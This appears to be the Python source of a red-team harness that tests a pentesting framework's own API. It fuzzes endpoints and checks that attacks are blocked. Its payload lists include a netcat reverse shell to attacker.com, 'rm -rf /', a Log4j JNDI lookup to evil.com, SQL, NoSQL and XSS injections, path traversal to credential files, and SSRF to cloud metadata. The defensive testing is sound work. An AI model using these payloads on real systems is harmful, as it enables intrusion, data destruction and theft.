"""
Red Team Framework for Adversarial Testing of Zen-AI-Pentest
Implements security testing of the framework itself
"""

import random
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin

import aiohttp


class AttackVector(Enum):
    """Attack vectors for testing"""

    AUTHENTICATION_BYPASS = "auth_bypass"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    INJECTION = "injection"
    SESSION_HIJACKING = "session_hijacking"
    CREDENTIAL_THEFT = "credential_theft"
    RATE_LIMIT_BYPASS = "rate_limit_bypass"
    INPUT_VALIDATION = "input_validation"
    CRYPTOGRAPHIC_FAILURE = "crypto_failure"
    CONFIGURATION_ERROR = "config_error"
    BUSINESS_LOGIC = "business_logic"


class TestSeverity(Enum):
    """Severity of test findings"""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class AdversarialTest:
    """Single adversarial test case"""

    test_id: str
    name: str
    description: str
    attack_vector: AttackVector
    severity: TestSeverity

    # Test parameters
    target_endpoint: str
    http_method: str
    payload: Any
    headers: Dict[str, str] = field(default_factory=dict)

    # Expected behavior
    expected_response: Optional[str] = None
    expected_status: Optional[int] = None
    should_be_blocked: bool = True

    # Results
    executed_at: Optional[datetime] = None
    actual_response: Optional[str] = None
    actual_status: Optional[int] = None
    passed: Optional[bool] = None
    findings: List[str] = field(default_factory=list)


@dataclass
class SecurityTestResult:
    """Result of security test execution"""

    test_id: str
    test_name: str
    attack_vector: AttackVector
    severity: TestSeverity
    passed: bool
    findings: List[str]
    evidence: Dict[str, Any]
    remediation: List[str]
    executed_at: datetime


class AuthenticationBypassTests:
    """Tests for authentication bypass vulnerabilities"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.test_cases: List[AdversarialTest] = []
        self._generate_tests()

    def _generate_tests(self):
        """Generate authentication bypass test cases"""
        # Test 1: JWT manipulation
        self.test_cases.append(
            AdversarialTest(
                test_id="AUTH-001",
                name="JWT Algorithm Confusion",
                description="Test for JWT algorithm confusion attack",
                attack_vector=AttackVector.AUTHENTICATION_BYPASS,
                severity=TestSeverity.CRITICAL,
                target_endpoint="/api/v1/agent/action",
                http_method="POST",
                payload={"alg": "none", "typ": "JWT"},
                headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30."},
                should_be_blocked=True,
            )
        )

        # Test 2: Empty token
        self.test_cases.append(
            AdversarialTest(
                test_id="AUTH-002",
                name="Empty Authorization Header",
                description="Test access with empty authorization",
                attack_vector=AttackVector.AUTHENTICATION_BYPASS,
                severity=TestSeverity.HIGH,
                target_endpoint="/api/v1/agent/status",
                http_method="GET",
                payload=None,
                headers={"Authorization": ""},
                should_be_blocked=True,
            )
        )

        # Test 3: Expired credential reuse
        self.test_cases.append(
            AdversarialTest(
                test_id="AUTH-003",
                name="Expired Credential Reuse",
                description="Test reuse of expired credentials",
                attack_vector=AttackVector.AUTHENTICATION_BYPASS,
                severity=TestSeverity.HIGH,
                target_endpoint="/api/v1/agent/action",
                http_method="POST",
                payload={"action": "scan", "target": "example.com"},
                headers={"X-Expired-Credential": "true"},
                should_be_blocked=True,
            )
        )

        # Test 4: Privilege escalation via role manipulation
        self.test_cases.append(
            AdversarialTest(
                test_id="AUTH-004",
                name="Role Manipulation",
                description="Test privilege escalation via role header",
                attack_vector=AttackVector.PRIVILEGE_ESCALATION,
                severity=TestSeverity.CRITICAL,
                target_endpoint="/api/v1/admin/agents",
                http_method="GET",
                payload=None,
                headers={"X-User-Role": "admin"},
                should_be_blocked=True,
            )
        )


class InjectionTests:
    """Tests for injection vulnerabilities"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.test_cases: List[AdversarialTest] = []
        self._generate_tests()

    def _generate_tests(self):
        """Generate injection test cases"""
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE agents; --",
            "' UNION SELECT * FROM credentials --",
            "1; SELECT * FROM pg_sleep(10) --",
        ]

        for i, payload in enumerate(sql_payloads):
            self.test_cases.append(
                AdversarialTest(
                    test_id=f"INJ-SQL-{i + 1:03d}",
                    name=f"SQL Injection Test {i + 1}",
                    description=f"Test SQL injection with payload: {payload[:30]}...",
                    attack_vector=AttackVector.INJECTION,
                    severity=TestSeverity.CRITICAL,
                    target_endpoint="/api/v1/agent/query",
                    http_method="POST",
                    payload={"query": payload},
                    should_be_blocked=True,
                )
            )

        # Command injection payloads
        cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(nc -e /bin/sh attacker.com 4444)",
            "; rm -rf /",
        ]

        for i, payload in enumerate(cmd_payloads):
            self.test_cases.append(
                AdversarialTest(
                    test_id=f"INJ-CMD-{i + 1:03d}",
                    name=f"Command Injection Test {i + 1}",
                    description=f"Test command injection with payload: {payload[:30]}...",
                    attack_vector=AttackVector.INJECTION,
                    severity=TestSeverity.CRITICAL,
                    target_endpoint="/api/v1/agent/execute",
                    http_method="POST",
                    payload={"command": f"nmap {payload}"},
                    should_be_blocked=True,
                )
            )

        # NoSQL injection
        nosql_payloads = [
            {"$gt": ""},
            {"$ne": None},
            {"$where": "sleep(5000)"},
        ]

        for i, payload in enumerate(nosql_payloads):
            self.test_cases.append(
                AdversarialTest(
                    test_id=f"INJ-NOSQL-{i + 1:03d}",
                    name=f"NoSQL Injection Test {i + 1}",
                    description="Test NoSQL injection",
                    attack_vector=AttackVector.INJECTION,
                    severity=TestSeverity.HIGH,
                    target_endpoint="/api/v1/agent/search",
                    http_method="POST",
                    payload={"filter": payload},
                    should_be_blocked=True,
                )
            )


class FuzzingEngine:
    """Fuzzing engine for input validation testing"""

    def __init__(self):
        self.mutators = [
            self._bit_flip_mutator,
            self._byte_flip_mutator,
            self._arithmetic_mutator,
            self._interesting_value_mutator,
            self._dictionary_mutator,
        ]

        self.interesting_values = [
            b"\x00",  # Null byte
            b"\xff",  # Max byte
            b"\x7f",  # Max signed byte
            b"\x80",  # Min signed byte
            b"A" * 10000,  # Long string
            b"<script>alert(1)</script>",  # XSS
            b"${jndi:ldap://evil.com}",  # Log4j
            b"%s%s%s%s%n",  # Format string
        ]

        self.dictionary = [
            "admin",
            "root",
            "password",
            "test",
            "example",
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "<",
            ">",
            "'",
            '"',
            "&",
            "|",
            ";",
            "$",
            "`",
        ]

    def generate_fuzz_payloads(self, seed: bytes, count: int = 100) -> List[bytes]:
        """Generate fuzzed payloads from seed"""
        payloads = []

        for _ in range(count):
            mutator = random.choice(self.mutators)
            payload = mutator(seed)
            payloads.append(payload)

        return payloads

    def _bit_flip_mutator(self, data: bytes) -> bytes:
        """Flip random bits in data"""
        if not data:
            return data

        data = bytearray(data)
        num_flips = random.randint(1, min(8, len(data) * 8))

        for _ in range(num_flips):
            byte_idx = random.randint(0, len(data) - 1)
            bit_idx = random.randint(0, 7)
            data[byte_idx] ^= 1 << bit_idx

        return bytes(data)

    def _byte_flip_mutator(self, data: bytes) -> bytes:
        """Flip random bytes in data"""
        if not data:
            return data

        data = bytearray(data)
        num_flips = random.randint(1, min(4, len(data)))

        for _ in range(num_flips):
            idx = random.randint(0, len(data) - 1)
            data[idx] = random.randint(0, 255)

        return bytes(data)

    def _arithmetic_mutator(self, data: bytes) -> bytes:
        """Apply arithmetic mutations"""
        if not data:
            return data

        data = bytearray(data)
        idx = random.randint(0, len(data) - 1)

        operations = [
            lambda x: (x + 1) % 256,
            lambda x: (x - 1) % 256,
            lambda x: (x + 10) % 256,
            lambda x: (x - 10) % 256,
            lambda x: (x * 2) % 256,
        ]

        data[idx] = random.choice(operations)(data[idx])
        return bytes(data)

    def _interesting_value_mutator(self, data: bytes) -> bytes:
        """Insert interesting values"""
        interesting = random.choice(self.interesting_values)

        if not data:
            return interesting

        # Insert at random position
        pos = random.randint(0, len(data))
        return data[:pos] + interesting + data[pos:]

    def _dictionary_mutator(self, data: bytes) -> bytes:
        """Insert dictionary values"""
        word = random.choice(self.dictionary).encode()

        if not data:
            return word

        pos = random.randint(0, len(data))
        return data[:pos] + word + data[pos:]

    def generate_targeted_payloads(self, target_type: str, count: int = 50) -> List[Dict]:
        """Generate targeted payloads for specific vulnerability types"""
        payloads = []

        if target_type == "xss":
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "' onmouseover='alert(1)",
                "<iframe src='javascript:alert(1)'>",
                "<body onload=alert('XSS')>",
            ]
            for _ in range(count):
                payloads.append(
                    {
                        "input": random.choice(xss_payloads),
                        "context": random.choice(["html", "attribute", "javascript", "url"]),
                    }
                )

        elif target_type == "path_traversal":
            traversal_patterns = [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                r"....\/....\/etc/passwd",
            ]
            for _ in range(count):
                payloads.append(
                    {
                        "path": random.choice(traversal_patterns),
                        "encoding": random.choice(["none", "url", "double_url", "unicode"]),
                    }
                )

        elif target_type == "ssrf":
            ssrf_targets = [
                "http://localhost:22",
                "http://127.0.0.1:8080",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]:80",
                "file:///etc/passwd",
                "dict://localhost:11211/",
                "gopher://localhost:9000/",
            ]
            for _ in range(count):
                payloads.append(
                    {
                        "url": random.choice(ssrf_targets),
                        "bypass": random.choice(["none", "redirect", "dns_rebinding"]),
                    }
                )

        return payloads


class RedTeamOrchestrator:
    """
    Orchestrates red team exercises against the framework
    """

    def __init__(self, target_url: str, api_key: Optional[str] = None):
        self.target_url = target_url
        self.api_key = api_key

        # Test suites
        self.auth_tests = AuthenticationBypassTests(target_url)
        self.injection_tests = InjectionTests(target_url)
        self.fuzzing_engine = FuzzingEngine()

        # Results
        self.results: List[SecurityTestResult] = []

        # Session
        self.session: Optional[aiohttp.ClientSession] = None

    async def initialize(self):
        """Initialize HTTP session"""
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20, ssl=False)  # For testing only

        timeout = aiohttp.ClientTimeout(total=30)

        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                "User-Agent": "Zen-Security-Test/1.0",
                "Accept": "application/json",
            },
        )

    async def cleanup(self):
        """Clean up resources"""
        if self.session:
            await self.session.close()

    async def run_all_tests(self) -> List[SecurityTestResult]:
        """Run all adversarial tests"""
        all_tests = []

        # Add authentication tests
        all_tests.extend(self.auth_tests.test_cases)

        # Add injection tests
        all_tests.extend(self.injection_tests.test_cases)

        # Execute tests
        for test in all_tests:
            result = await self._execute_test(test)
            self.results.append(result)

        # Run fuzzing tests
        fuzz_results = await self._run_fuzzing_tests()
        self.results.extend(fuzz_results)

        return self.results

    async def _execute_test(self, test: AdversarialTest) -> SecurityTestResult:
        """Execute a single test case"""
        test.executed_at = datetime.now(timezone.utc)

        url = urljoin(self.target_url, test.target_endpoint)

        try:
            # Prepare request
            headers = test.headers.copy()
            if self.api_key:
                headers["X-API-Key"] = self.api_key

            # Execute request
            if test.http_method == "GET":
                async with self.session.get(url, headers=headers) as resp:
                    test.actual_status = resp.status
                    test.actual_response = await resp.text()

            elif test.http_method == "POST":
                async with self.session.post(url, headers=headers, json=test.payload) as resp:
                    test.actual_status = resp.status
                    test.actual_response = await resp.text()

            # Evaluate result
            test.passed = self._evaluate_test(test)

        except Exception as e:
            test.actual_response = str(e)
            test.passed = False
            test.findings.append(f"Request failed: {str(e)}")

        return SecurityTestResult(
            test_id=test.test_id,
            test_name=test.name,
            attack_vector=test.attack_vector,
            severity=test.severity,
            passed=test.passed,
            findings=test.findings,
            evidence={
                "request": {
                    "url": url,
                    "method": test.http_method,
                    "headers": test.headers,
                    "payload": test.payload,
                },
                "response": {
                    "status": test.actual_status,
                    "body": (test.actual_response[:1000] if test.actual_response else None),
                },
            },
            remediation=self._generate_remediation(test),
            executed_at=test.executed_at,
        )

    def _evaluate_test(self, test: AdversarialTest) -> bool:
        """Evaluate if test passed (attack was blocked)"""
        if test.should_be_blocked:
            # Should be blocked - check for blocking indicators
            if test.actual_status in [401, 403, 429]:
                return True

            if test.actual_status == 400:
                return True

            # Check for security headers
            if test.actual_response:
                security_indicators = [
                    "unauthorized",
                    "forbidden",
                    "invalid",
                    "blocked",
                    "rejected",
                ]
                response_lower = test.actual_response.lower()
                if any(ind in response_lower for ind in security_indicators):
                    return True

            # Attack succeeded - test failed
            test.findings.append(f"Attack not blocked: HTTP {test.actual_status}")
            return False

        else:
            # Should succeed
            return test.actual_status in [200, 201, 202]

    def _generate_remediation(self, test: AdversarialTest) -> List[str]:
        """Generate remediation suggestions"""
        remediations = []

        if test.attack_vector == AttackVector.AUTHENTICATION_BYPASS:
            remediations.extend(
                [
                    "Implement proper JWT validation with algorithm whitelist",
                    "Use strong token signing with RS256 or ES256",
                    "Validate all authentication tokens server-side",
                    "Implement token expiration checks",
                ]
            )

        elif test.attack_vector == AttackVector.INJECTION:
            remediations.extend(
                [
                    "Use parameterized queries for all database operations",
                    "Implement input validation and sanitization",
                    "Use allowlists for command execution",
                    "Apply principle of least privilege",
                ]
            )

        elif test.attack_vector == AttackVector.PRIVILEGE_ESCALATION:
            remediations.extend(
                [
                    "Implement role-based access control (RBAC)",
                    "Validate permissions server-side for every request",
                    "Use defense in depth for sensitive operations",
                    "Log all privilege escalation attempts",
                ]
            )

        return remediations

    async def _run_fuzzing_tests(self) -> List[SecurityTestResult]:
        """Run fuzzing-based tests"""
        results = []

        # Test input validation with fuzzing
        endpoints_to_fuzz = [
            "/api/v1/agent/action",
            "/api/v1/agent/query",
            "/api/v1/target/validate",
        ]

        for endpoint in endpoints_to_fuzz:
            fuzz_results = await self._fuzz_endpoint(endpoint)
            results.extend(fuzz_results)

        return results

    async def _fuzz_endpoint(self, endpoint: str) -> List[SecurityTestResult]:
        """Fuzz a specific endpoint"""
        results = []
        url = urljoin(self.target_url, endpoint)

        # Generate fuzz payloads
        seed = b'{"action": "scan", "target": "example.com"}'
        payloads = self.fuzzing_engine.generate_fuzz_payloads(seed, count=20)

        for i, payload in enumerate(payloads):
            try:
                async with self.session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/json"},
                ) as resp:
                    # Check for interesting responses
                    if resp.status == 500:
                        results.append(
                            SecurityTestResult(
                                test_id=f"FUZZ-{endpoint.replace('/', '-')}-{i}",
                                test_name=f"Fuzzing Test {i}",
                                attack_vector=AttackVector.INPUT_VALIDATION,
                                severity=TestSeverity.MEDIUM,
                                passed=False,
                                findings=["Server error (500) on fuzzed input"],
                                evidence={
                                    "payload": payload[:200].decode("utf-8", errors="ignore"),
                                    "status": resp.status,
                                },
                                remediation=["Implement robust input validation"],
                                executed_at=datetime.now(timezone.utc),
                            )
                        )

                    elif resp.status == 200:
                        body = await resp.text()
                        # Check for information disclosure
                        sensitive_patterns = [
                            "password",
                            "secret",
                            "key",
                            "token",
                            "internal",
                            "debug",
                            "traceback",
                        ]

                        body_lower = body.lower()
                        found_patterns = [p for p in sensitive_patterns if p in body_lower]

                        if found_patterns:
                            results.append(
                                SecurityTestResult(
                                    test_id=f"FUZZ-INFO-{i}",
                                    test_name=f"Information Disclosure Test {i}",
                                    attack_vector=AttackVector.INPUT_VALIDATION,
                                    severity=TestSeverity.HIGH,
                                    passed=False,
                                    findings=[f"Potential information disclosure: {found_patterns}"],
                                    evidence={
                                        "patterns_found": found_patterns,
                                        "response_snippet": body[:500],
                                    },
                                    remediation=["Remove debug information from responses"],
                                    executed_at=datetime.now(timezone.utc),
                                )
                            )

            except Exception as e:
                # Timeout or connection error might indicate DoS
                results.append(
                    SecurityTestResult(
                        test_id=f"FUZZ-DOS-{i}",
                        test_name=f"DoS Test {i}",
                        attack_vector=AttackVector.INPUT_VALIDATION,
                        severity=TestSeverity.MEDIUM,
                        passed=False,
                        findings=[f"Request caused error: {str(e)}"],
                        evidence={"error": str(e)},
                        remediation=["Implement request timeouts and size limits"],
                        executed_at=datetime.now(timezone.utc),
                    )
                )

        return results

    def generate_report(self) -> Dict:
        """Generate comprehensive security test report"""
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        failed_tests = total_tests - passed_tests

        # Group by severity
        severity_counts = {}
        for result in self.results:
            if not result.passed:
                sev = result.severity.value
                severity_counts[sev] = severity_counts.get(sev, 0) + 1

        # Group by attack vector
        vector_counts = {}
        for result in self.results:
            if not result.passed:
                vec = result.attack_vector.value
                vector_counts[vec] = vector_counts.get(vec, 0) + 1

        # Critical findings
        critical_findings = [
            {
                "test_id": r.test_id,
                "name": r.test_name,
                "severity": r.severity.value,
                "vector": r.attack_vector.value,
                "findings": r.findings,
            }
            for r in self.results
            if not r.passed and r.severity in [TestSeverity.CRITICAL, TestSeverity.HIGH]
        ]

        return {
            "summary": {
                "total_tests": total_tests,
                "passed": passed_tests,
                "failed": failed_tests,
                "pass_rate": (round(passed_tests / total_tests * 100, 2) if total_tests > 0 else 0),
            },
            "severity_distribution": severity_counts,
            "attack_vector_distribution": vector_counts,
            "critical_findings": critical_findings,
            "all_results": [
                {
                    "test_id": r.test_id,
                    "name": r.test_name,
                    "passed": r.passed,
                    "severity": r.severity.value,
                    "vector": r.attack_vector.value,
                }
                for r in self.results
            ],
            "generated_at": datetime.now(timezone.utc).isoformat(),
        }
